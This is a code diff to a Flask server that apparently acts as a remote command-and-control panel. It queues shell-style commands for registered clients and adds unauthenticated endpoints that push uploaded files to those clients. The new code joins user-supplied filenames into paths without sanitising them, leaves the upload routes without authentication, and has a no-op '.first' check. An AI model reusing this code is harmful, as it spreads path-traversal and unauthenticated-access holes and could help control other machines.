@@ -1,5 +1,5 @@
 import os
-from flask import Flask, redirect, url_for, render_template, request, jsonify, make_response
+from flask import Flask, redirect, url_for, render_template, request, jsonify, make_response, send_file
 from flask_sqlalchemy import SQLAlchemy
 import bcrypt
 import jwt
@@ -19,6 +19,7 @@ import time
 # Load environment variables
 load_dotenv()
 SECRET_KEY = os.getenv('JWT_SECRET_KEY')
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
 # Global variables
 command_to_execute = {}
@@ -247,11 +248,12 @@ command_initiator = ""
 def execute_command(decoded_token):
     global command_initiator
     command_initiator = decoded_token['user']['codename']
-    print(command_initiator)
     command_json = request.get_json()
-    # print(command_json)
-    # print(command_json["command"])
     if command_json["command"] and command_json["clientid"]:
+        client_in_database = ClientData.query.filter_by(client_id=command_json["clientid"]).first()
+        if not client_in_database:
+            return jsonify({"error": "Client is not found in database"})
+        
         command_to_execute[command_json["clientid"]] = command_json["command"]
         print(command_to_execute)
         print(f"Received command: {command_json["command"]}")  # Log the received command in the terminal
@@ -328,6 +330,75 @@ def upload_file():
     file.save(file_path)
     return f'File uploaded successfully: {file.filename}'
 
+
+
+@app.route('/api/uploadFromFiles', methods=['POST'])
+def upload_from_files():
+    client_id = request.form.get('client_id')
+    
+    if not client_id:
+        return jsonify({"success": False, "message": "Client ID is required."}), 400
+    client_in_database = ClientData.query.filter_by(client_id=client_id).first
+    if 'files' not in request.files:
+        return jsonify({"success": False, "message": "No file part."}), 400
+
+    files = request.files.getlist('files')
+
+    if len(files) == 0:
+        return jsonify({"success": False, "message": "No files selected."}), 400
+
+    saved_files = []
+    for file in files:
+        if file.filename == '':
+            continue
+        
+        upload_path = os.path.join(UPLOAD_FOLDER, "FILES_TO_SEND_TO_CLIENT")
+        os.makedirs(upload_path, exist_ok=True)
+        file_path = os.path.join(upload_path, f"{client_id}-{file.filename}")
+        file.save(file_path)
+        command_to_execute[client_id] = json.dumps({
+            "command": "UploadFromFiles",
+            "client_id": client_id,
+            "filename": file.filename
+        })
+
+        saved_files.append(file.filename)
+
+    if len(saved_files) == 0:
+        return jsonify({"success": False, "message": "No valid files to save."}), 400
+
+    return jsonify({
+        "success": True,
+        "message": f"File successfully uploaded to server to send to client {client_id}.",
+        "files": saved_files
+    })
+
+
+@app.route("/api/upload-file-to-client", methods=["GET"])
+def upload_file_to_client():
+    try:
+        # Extract client_id and filename from request parameters
+        client_id = request.args.get("clientID")
+        filename = request.args.get("filename")
+        if not client_id or not filename:
+            return jsonify({"error": "Missing clientID or filename"}), 400
+
+        # Construct the full filename
+        full_filename = f"{client_id}-{filename}"
+        print(full_filename)
+        file_path = os.path.join(BASE_DIR,"uploads/FILES_TO_SEND_TO_CLIENT", full_filename)
+        print(file_path)
+        # Check if file exists
+        if os.path.exists(file_path):
+            print("fileeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee")
+            return send_file(file_path, as_attachment=True)
+        else:
+            return jsonify({"error": "File not found"}), 404
+
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
 def background_thread():
     while True:
         with app.app_context():  # Ensure we have an active application context
@@ -384,9 +455,7 @@ def handle_connect():
         if thread is None:
             thread = socketio.start_background_task(background_thread)
 
-@app.route('/tabs', methods=['GET'])
-def tabs():
-    return render_template('tab.html')
+
 
 def add_command_log(client_id, command_initiator, command, result):
     # Prepare command history in JSON format
@@ -441,13 +510,6 @@ def super_admin_panel(decoded_token):
         return jsonify({"error": "Access forbidden"}), 403  # Return an error if not a superadmin
 
 
-
-
-# Just code to show how to get all enteirs from database(without admin) in json so that chatgpt understands it. 
-# with app.app_context():
-#     admins = Admin.query.filter(Admin.codename != 'admin').all()
-#     admin_list = [{'id': admin.id, 'codename': admin.codename, 'role': admin.role} for admin in admins]
-#     print(admin_list)  # Printing the JSON-like list directly
 @app.route('/api/getAllAdmins', methods=['GET'])
 @token_required
 def get_all_admins(decoded_token):
